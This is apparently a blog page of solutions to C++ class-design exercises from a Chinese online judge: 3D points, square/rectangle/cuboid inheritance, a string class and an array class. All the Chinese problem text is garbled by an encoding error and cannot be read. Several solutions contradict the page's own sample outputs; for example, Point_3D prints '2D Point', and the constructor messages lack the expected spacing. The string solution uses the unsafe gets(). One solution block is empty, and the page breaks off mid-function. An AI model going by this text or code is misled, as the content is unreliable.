<p>è®¾è®¡Point_3Dç±»éœ€æ”¯æŒä¸€ä¸‹æ“ä½œï¼š</p>
<p>Point_3D::Point_3D()æ— å‚æ„é€ ã€‚</p>
<p>Point_3D::Point_3D(double,double,double)ä¸‰ä¸ªåæ ‡å‚æ•°æ„é€ ã€‚</p>
<p>Point_3D::z()è¿”å›zåæ ‡ã€‚</p>
<p>Point_3D::z(int)ä¿®æ”¹zåæ ‡å¹¶è¿”å›ã€‚</p>
<p>Point_3D::showPoint()æŒ‰æ ¼å¼è¾“å‡ºPoint_3Då¯¹è±¡ã€‚</p>
<p>Point_3D::setPoint(double,double,double)æ ¹æ®ä¸‰ä¸ªåæ ‡å‚æ•°ä¿®æ”¹Point_3Då¯¹è±¡çš„åæ ‡ã€‚</p>
<p>Point_3D::showNumber()è¿”å›Point_3Då¯¹è±¡æ€»æ•°çš„é™æ€å‡½æ•°ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡Pointç±»å’ŒPoint_3Dç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-39"><a href="#Input-39" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œåé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°mï¼Œmæœ‰ä¸¤ç§å–å€¼ï¼š2ã€3ï¼›mä¸º2æ—¶ï¼Œåé¢æœ‰ä¸¤ä¸ªæµ®ç‚¹æ•°xã€yï¼Œè¡¨ç¤ºä¸€ä¸ªå¹³é¢ä¸Šçš„ç‚¹çš„åæ ‡(x,y)ï¼›mä¸º3æ—¶åé¢æœ‰3ä¸ªæµ®ç‚¹æ•°xã€yã€zï¼Œè¡¨ç¤ºä¸€ä¸ª3ç»´çš„ç‚¹çš„åæ ‡(x,y,z)ã€‚</p>
<h2 id="Output-39"><a href="#Output-39" class="headerlink" title="Output"></a>Output</h2><p>å¼€å§‹éƒ¨åˆ†ä¸ºç”±main()å‡½æ•°äº§ç”Ÿçš„å›ºå®šè¾“å‡ºï¼Œç”¨äºæµ‹è¯•å¯¹è±¡çš„æŸäº›æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚è¾“å‡ºâ€œTest data output :â€ä¹‹åä¸ºæµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºï¼š</p>
<p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚</p>
<p>è‹¥è¾“å…¥ä¸ºå¹³é¢ä¸Šçš„ç‚¹ï¼Œåˆ™è¾“å‡ºï¼šâ€œ2D Point (x,y)â€ï¼Œxå’Œyä¸ºè¾“å…¥çš„åæ ‡å€¼ã€‚</p>
<p>è‹¥è¾“å…¥ä¸º3ç»´çš„ç‚¹ï¼Œåˆ™è¾“å‡ºï¼šâ€œ3D Point (x,y,y)â€ï¼Œxã€yå’Œzä¸ºè¾“å…¥çš„åæ ‡å€¼ã€‚</p>
<p>æœ€åï¼Œåˆ†åˆ«è¾“å‡ºæ€»å…±è¾“å…¥çš„å¹³é¢ä¸Šçš„ç‚¹æ•°å’Œ3ç»´çš„ç‚¹æ•°ã€‚</p>
<h2 id="Sample-Input-39"><a href="#Sample-Input-39" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>53 1 2 33 0 0 02 -1 13 -1 -1 -12 0 0</p>
<h2 id="Sample-Output-39"><a href="#Sample-Output-39" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Invariable test output :3D Point (-100,0,100)Point (0,100,100)Test data output :3D Point (1,2,3)3D Point (0,0,0)2D Point (-1,1)3D Point (-1,-1,-1)2D Point (0,0)Number of 2D Points : 2Number of 3D Points : 3</p>
<h2 id="HINT-39"><a href="#HINT-39" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-39"><a href="#Append-Code-39" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1393&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point&#123;
public:
    static int num;
    double a,b;
    Point()&#123;&#125;
    Point(double aa,double bb):a(aa),b(bb)&#123;num++;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    double x()&#123;return a;&#125;
    double y()&#123;return b;&#125;
    double x(double xx)&#123;a=xx;return a;&#125;
    double y(double yy)&#123;b=yy;return b;&#125;
    static int showNumber()&#123;return num+1;&#125;
&#125;;
class Point_3D:public Point&#123;
public:
    static int numm;
    double c;
    Point_3D()&#123;&#125;
    Point_3D(double aa,double bb,double cc):Point(aa,bb),c(cc)&#123;numm++;&#125;
    double z()&#123;return c;&#125;
    double z(double zz)&#123;c=zz;return c;&#125;
    static int showNumber()&#123;return numm+1;&#125;
    void setPoint(double aa,double bb,double cc)&#123;a=aa;b=bb;c=cc;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
int Point::num = 0;
int Point_3D::numm = 0;
////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Invariable test output :&quot;&lt;&lt;endl;
    Point_3D p3d;
    p3d.setPoint(-100, 0, 100);
    p3d.showPoint();
    p3d.x(0);
    p3d.y(100);
    cout&lt;&lt;&quot;Point (&quot;&lt;&lt;p3d.x()&lt;&lt;&quot;,&quot;&lt;&lt;p3d.y()&lt;&lt;&quot;,&quot;&lt;&lt;p3d.z()&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        double x, y, z;
        int point_type;
        cin&gt;&gt;point_type;
        if(point_type == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            Point p(x, y);
            p.showPoint();
        &#125;
        if(point_type == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            Point_3D p(x, y, z);
            p.showPoint();
        &#125;
    &#125;
    cout&lt;&lt;&quot;Number of 2D Points : &quot;&lt;&lt;Point::showNumber() - Point_3D::showNumber()&lt;&lt;endl;
    cout&lt;&lt;&quot;Number of 3D Points : &quot;&lt;&lt;Point_3D::showNumber() - 1&lt;&lt;endl;
&#125;</code></pre>
<h3 id="41-æ­£æ–¹å½¢ã€é•¿æ–¹å½¢ã€ç«‹æ–¹ä½“"><a href="#41-æ­£æ–¹å½¢ã€é•¿æ–¹å½¢ã€ç«‹æ–¹ä½“" class="headerlink" title="41.æ­£æ–¹å½¢ã€é•¿æ–¹å½¢ã€ç«‹æ–¹ä½“"></a>41.æ­£æ–¹å½¢ã€é•¿æ–¹å½¢ã€ç«‹æ–¹ä½“</h3><blockquote>
<h2 id="Description-40"><a href="#Description-40" class="headerlink" title="Description"></a>Description</h2><p>ç»™å‡ºæ­£æ–¹å½¢ï¼ˆSquareï¼‰ã€é•¿æ–¹å½¢ï¼ˆRectangleï¼‰ã€ç«‹æ–¹ä½“ï¼ˆCuboidï¼‰çš„è¾¹é•¿ï¼Œæ±‚å‘¨é•¿ã€é¢ç§¯ã€ä½“ç§¯ã€‚</p>
<p>Squareç±»åªéœ€å­˜ä¸€æ¡è¾¹é•¿ï¼Œæ„é€ å‡½æ•°äº§ç”Ÿä¸€æ¡è¾“å‡ºï¼Œæœ‰è¾¹é•¿ã€å‘¨é•¿ã€é¢ç§¯çš„å‡½æ•°ã€‚</p>
<p>Rectangleç±»éœ€å­˜é•¿å’Œå®½ï¼Œè‹¥ä»Squareç±»æ´¾ç”Ÿè€Œæ¥ï¼Œå› æ­¤åªéœ€å¢åŠ ä¸€æ¡è¾¹ï¼Œæ„é€ å‡½æ•°äº§ç”Ÿä¸€æ¡è¾“å‡ºï¼Œæœ‰é•¿ã€å®½ã€å‘¨é•¿ã€é¢ç§¯çš„å‡½æ•°ã€‚</p>
<p>Cuboidç±»éœ€å­˜é•¿å®½é«˜ï¼Œè‹¥ä»Rectangleç±»æ´¾ç”Ÿè€Œæ¥ï¼Œå› æ­¤ä¹Ÿåªå¢åŠ ä¸€æ¡è¾¹ï¼Œæ„é€ å‡½æ•°äº§ç”Ÿä¸€æ¡è¾“å‡ºï¼Œæœ‰é•¿ã€å®½ã€é«˜ã€å‘¨é•¿ã€é¢ç§¯ã€ä½“ç§¯çš„å‡½æ•°ã€‚å®ƒçš„å‘¨é•¿å®šä¹‰ä¸ºæ‰€æœ‰æ£±é•¿ä¹‹å’Œã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>è¯·ä»”ç»†é˜…è¯»append.ccä»£ç ï¼Œå¹¶è®¾è®¡å¥½æ­£æ–¹å½¢ã€é•¿æ–¹å½¢ã€ç«‹æ–¹ä½“æ´¾ç”Ÿå…³ç³»ï¼Œä½¿main()å‡½æ•°èƒ½å¤Ÿè¿è¡Œå¹¶å¾—åˆ°æ­£ç¡®çš„è¾“å‡ºã€‚</p>
<h2 id="Input-40"><a href="#Input-40" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œæ¯ä¸€éƒ¨åˆ†éƒ½å·²ä¸€ä¸ªæ•´æ•°nå¼€å§‹ï¼Œè¡¨ç¤ºåé¢æœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åœ¨ç¬¬ä¸€éƒ¨åˆ†æµ‹è¯•æ•°æ®ä¸­ï¼Œæ¯ç»„æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ­£æ–¹å½¢çš„è¾¹é•¿ã€‚</p>
<p>åœ¨ç¬¬äºŒéƒ¨åˆ†æµ‹è¯•æ•°æ®ä¸­ï¼Œæ¯ç»„æ˜¯ä¸¤ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºé•¿æ–¹å½¢çš„é•¿å’Œå®½ã€‚</p>
<p>åœ¨ç¬¬ä¸‰éƒ¨åˆ†æµ‹è¯•æ•°æ®ä¸­ï¼Œæ¯ç»„æ˜¯ä¸‰ä¸ªæ•´æ•°ï¼Œ è¡¨ç¤ºç«‹æ–¹ä½“çš„é•¿å’Œå®½ã€‚</p>
<h2 id="Output-40"><a href="#Output-40" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºä¸ºä¸¤éƒ¨åˆ†ï¼Œå‰é¢æ˜¯æ„é€ å‡½æ•°çš„è¾“å‡ºï¼Œæœ€åæ˜¯è¾“å‡ºå›¾å½¢çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬é•¿å®½é«˜ã€å‘¨é•¿ã€é¢ç§¯ã€ä½“ç§¯ç­‰ä¿¡æ¯ï¼Œæ ¼å¼è§sampleï¼›</p>
<h2 id="Sample-Input-40"><a href="#Sample-Input-40" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1413 413 4 6</p>
<h2 id="Sample-Output-40"><a href="#Sample-Output-40" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Construct Square (4)A Square length 4, Perimeter 16, Area 16=========================Construct Square (3)Construct Rectangle (3, 4)A Rectangle length 3, width 4, Perimeter 14, Area 12=========================Construct Square (3)Construct Rectangle (3, 4)Construct Cuboid (3, 4, 6)A Cuboid length 3, width 4, height 6, Perimeter 52, Area 108, Volume 72</p>
<h2 id="HINT-40"><a href="#HINT-40" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-40"><a href="#Append-Code-40" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1678&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1678&getkey=">append.cc</a>,     </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Square&#123;
public:
    int a;
    Square()&#123;&#125;
    Square(int aa):a(aa)&#123;cout &lt;&lt; &quot;Construct Square (&quot; &lt;&lt; a &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int perimeter()&#123;return 4*a;&#125;
    int area()&#123;return a*a;&#125;
&#125;;
class Rectangle:public Square&#123;
public:
    int b;
    Rectangle()&#123;&#125;
    Rectangle(int aa,int bb):Square(aa),b(bb)&#123;cout &lt;&lt; &quot;Construct Rectangle (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int width()&#123;return b;&#125;
    int perimeter()&#123;return 2*(a+b);&#125;
    int area()&#123;return a*b;&#125;
&#125;;
class Cuboid:public Rectangle&#123;
public:
    int c;
    Cuboid()&#123;&#125;
    Cuboid(int aa,int bb,int cc):Rectangle(aa,bb),c(cc)&#123;cout &lt;&lt; &quot;Construct Cuboid (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int width()&#123;return b;&#125;
    int height()&#123;return c;&#125;
    int perimeter()&#123;return 4*(a+b+c);&#125;
    int area()&#123;return 2*(a*b+a*c+b*c);&#125;
    int volume()&#123;return a*b*c;&#125;
&#125;;
////////////////////////
int main()
&#123;
    int cases, l, w, h;
    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l;
        Square squa(l);
        cout &lt;&lt; &quot;A Square length &quot; &lt;&lt; squa.length() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; squa.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; squa.area() &lt;&lt; endl;
    &#125;

    cout &lt;&lt; &quot;=========================&quot; &lt;&lt; endl;

    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l &gt;&gt; w;
        Rectangle rect(l, w);
        cout &lt;&lt; &quot;A Rectangle length &quot; &lt;&lt; rect.length() &lt;&lt; &quot;, width &quot; &lt;&lt; rect.width() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; rect.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; rect.area() &lt;&lt; endl;
    &#125;

    cout &lt;&lt; &quot;=========================&quot; &lt;&lt; endl;

    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l &gt;&gt; w &gt;&gt; h;
        Cuboid cubo(l, w, h);
        cout &lt;&lt; &quot;A Cuboid length &quot; &lt;&lt; cubo.length() &lt;&lt; &quot;, width &quot; &lt;&lt; cubo.width() &lt;&lt; &quot;, height &quot; &lt;&lt; cubo.height() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; cubo.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; cubo.area() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Volume &quot; &lt;&lt; cubo.volume() &lt;&lt; endl;
    &#125;

&#125;
</code></pre>
<h3 id="42-å­—ç¬¦ä¸²ç±»ï¼ˆIï¼‰"><a href="#42-å­—ç¬¦ä¸²ç±»ï¼ˆIï¼‰" class="headerlink" title="42.å­—ç¬¦ä¸²ç±»ï¼ˆIï¼‰*"></a>42.å­—ç¬¦ä¸²ç±»ï¼ˆIï¼‰*</h3><blockquote>
<h2 id="Description-41"><a href="#Description-41" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªå­—ç¬¦ä¸²ç±»ï¼Œç”¨äºå­˜å‚¨å­—ç¬¦ä¸²å’Œå¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. STR::STR()æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²å¯¹è±¡ã€‚</p>
<p>\2. STR::STR(const char *)æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¸²çš„å†…å®¹ç”±å‚æ•°ç»™å‡ºã€‚</p>
<p>\3. STR::length()æ–¹æ³•ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
<p>\4. STR::putline()æ–¹æ³•ï¼šè¾“å‡ºä¸²çš„å†…å®¹ï¼Œå¹¶æ¢è¡Œã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªå­—ç¬¦ä¸²ç±»STRï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>Invalid Wordï¼ˆç¦ç”¨å•è¯ï¼‰é”™è¯¯ï¼šâ€œstringâ€ã€â€œvectorâ€ç­‰è¢«ç¦ç”¨ã€‚</p>
<h2 id="Input-41"><a href="#Input-41" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥æœ‰è‹¥å¹²è¡Œï¼Œæ¯è¡Œä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<h2 id="Output-41"><a href="#Output-41" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”è¾“å‡ºä¸€è¡Œï¼ŒåŒ…å«ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè¾“å…¥ä¸²çš„é•¿åº¦ï¼Œç„¶åæ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä¸¤è€…ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-41"><a href="#Sample-Input-41" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>A123456789</p>
<h2 id="Sample-Output-41"><a href="#Sample-Output-41" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>0 12 Hello World!1 A9 123456789</p>
<h2 id="HINT-41"><a href="#HINT-41" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-41"><a href="#Append-Code-41" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1578&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>
#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
using namespace std;
int len(char * s)
&#123;
    int i = 0; int len_ = 0;
    while(s[i] != &#39;\0&#39; ) &#123; len_++; i++; &#125;
    return len_;
&#125;
void strcpy_(char *s, char *t)
&#123;
    int i  = 0;
    while(t[i] != &#39;\0&#39;) &#123; s[i] = t[i]; i++; &#125;
    s[i] = &#39;\0&#39;;
&#125;
class STR
&#123;
public:
    int length() const &#123; return len(stl); &#125;
    void putline() const &#123;  cout &lt;&lt; stl &lt;&lt; endl; &#125;
public:
    STR(char *s = NULL )
    &#123;
        if(s == NULL)
        &#123;
            stl = new char[1];
            stl[0] = &#39;\0&#39;;
        &#125;
        else
        &#123;
            stl = new char[len(s) + 1];
            strcpy_(stl,s);
        &#125;
    &#125;
private:
    char *stl;
&#125;;
int main()
&#123;
    STR e;
    STR h(&quot;Hello World!&quot;);
    char s[100001];
    cout &lt;&lt; e.length() &lt;&lt; &quot; &quot;;
    e.putline();
    cout &lt;&lt; h.length() &lt;&lt; &quot; &quot;;
    h.putline();
    while(gets(s) != NULL)
    &#123;
        STR str(s);
        cout &lt;&lt; str.length() &lt;&lt; &quot; &quot;;
        str.putline();
    &#125;
&#125;</code></pre>
<h3 id="43-å­—ç¬¦ä¸²ç±»ï¼ˆIIï¼‰"><a href="#43-å­—ç¬¦ä¸²ç±»ï¼ˆIIï¼‰" class="headerlink" title="43.å­—ç¬¦ä¸²ç±»ï¼ˆIIï¼‰"></a>43.å­—ç¬¦ä¸²ç±»ï¼ˆIIï¼‰</h3><blockquote>
<h2 id="Description-42"><a href="#Description-42" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªå­—ç¬¦ä¸²ç±»ï¼Œç”¨äºå­˜å‚¨å­—ç¬¦ä¸²å’Œå¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. STR::STR()æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²å¯¹è±¡ã€‚</p>
<p>\2. STR::STR(const char *)æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¸²çš„å†…å®¹ç”±å‚æ•°ç»™å‡ºã€‚</p>
<p>\3. STR::length()æ–¹æ³•ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</p>
<p>\4. STR::putline()æ–¹æ³•ï¼šè¾“å‡ºä¸²çš„å†…å®¹ï¼Œå¹¶æ¢è¡Œã€‚</p>
<p>\5. è¿ç®—ç¬¦â€œ+â€å’Œâ€œ+=â€ï¼Œè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦ä¸²çš„è¿æ¥è¿ç®—ï¼Œè§„åˆ™ä¸ºï¼š</p>
<p>   c = a + b è¡¨ç¤ºä¸²cä¸­çš„å­—ç¬¦æ˜¯aå’Œbçš„è¿æ¥ï¼šâ€œa+bâ€çš„ç»“æœæ˜¯ä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ï¼Œä¸²aå’Œä¸²bçš„å†…å®¹ä¸å˜ã€‚</p>
<p>   a += b    è¡¨ç¤ºä¸²aä¸­çš„å­—ç¬¦æ˜¯aå’Œbçš„è¿æ¥ï¼šä¸²bä¸­çš„å†…å®¹ä¸å˜</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªå­—ç¬¦ä¸²ç±»STRï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>Invalid Wordï¼ˆç¦ç”¨å•è¯ï¼‰é”™è¯¯ï¼šâ€œstringâ€ã€â€œvectorâ€ç­‰è¢«ç¦ç”¨ã€‚</p>
<h2 id="Input-42"><a href="#Input-42" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥æœ‰è‹¥å¹²è¡Œï¼Œæ¯è¡Œä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<h2 id="Output-42"><a href="#Output-42" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”è¾“å‡ºä¸€è¡Œï¼ŒåŒ…å«ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºè¾“å…¥ä¸²çš„é•¿åº¦ï¼Œç„¶åæ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä¸¤è€…ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-42"><a href="#Sample-Input-42" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>A123456789</p>
<h2 id="Sample-Output-42"><a href="#Sample-Output-42" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>12 Hello World!0 12 Hello World!12 Hello World!12 Hello World!10 A1234567891 A9 12345678910 123456789A1 A</p>
<h2 id="HINT-42"><a href="#HINT-42" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-42"><a href="#Append-Code-42" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1579&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code></code></pre>
<h3 id="44-æ•°ç»„ç±»ï¼ˆIï¼‰"><a href="#44-æ•°ç»„ç±»ï¼ˆIï¼‰" class="headerlink" title="44.æ•°ç»„ç±»ï¼ˆIï¼‰"></a>44.æ•°ç»„ç±»ï¼ˆIï¼‰</h3><blockquote>
<h2 id="Description-43"><a href="#Description-43" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ•´å‹æ•°ç»„ç±»ï¼Œç”¨äºå­˜å‚¨æ•´æ•°å’Œå¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Array::Array()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ã€‚</p>
<p>\2. Array::size()æ–¹æ³•ï¼šè¿”å›Arrayå¯¹è±¡ä¸­å…ƒç´ ä¸ªæ•°ã€‚</p>
<p>\3. Array::get(int n)æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»è¾“å…¥è¯»å–nå…ƒç´ ã€‚</p>
<p>\4. ä¸‹æ ‡è¿ç®—ç¬¦ï¼šè¿”å›ä¸‹æ ‡æ‰€æŒ‡çš„å…ƒç´ ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ•°ç»„ç±»Arrayï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°</p>
<h2 id="Input-43"><a href="#Input-43" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„æ¯è¡Œä»¥ä¸€ä¸ªæ•´æ•°kå¼€å¤´ï¼Œè¡¨ç¤ºåé¢æœ‰kä¸ªæ•´æ•°ã€‚</p>
<h2 id="Output-43"><a href="#Output-43" class="headerlink" title="Output"></a>Output</h2><p>æŠŠè¾“å…¥çš„æ•°ç»„ï¼Œè¾“å‡ºå‡ºæ¥ã€‚æ¯è¡Œæ•°æ®å¯¹åº”ä¸€ä¸ªè¾“å‡ºã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-43"><a href="#Sample-Input-43" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>42 10 201 003 1 2 3</p>
<h2 id="Sample-Output-43"><a href="#Sample-Output-43" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>10 2001 2 3</p>
<h2 id="HINT-43"><a href="#HINT-43" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-43"><a href="#Append-Code-43" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1572&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;string&gt;
using namespace std;
class Array&#123;
public:
    vector&lt;int&gt; a;
    int l;
    Array():l(0)&#123;&#125;
    int size()&#123;return l;&#125;
    void get(int n)&#123;
        l=n;a.resize(n);
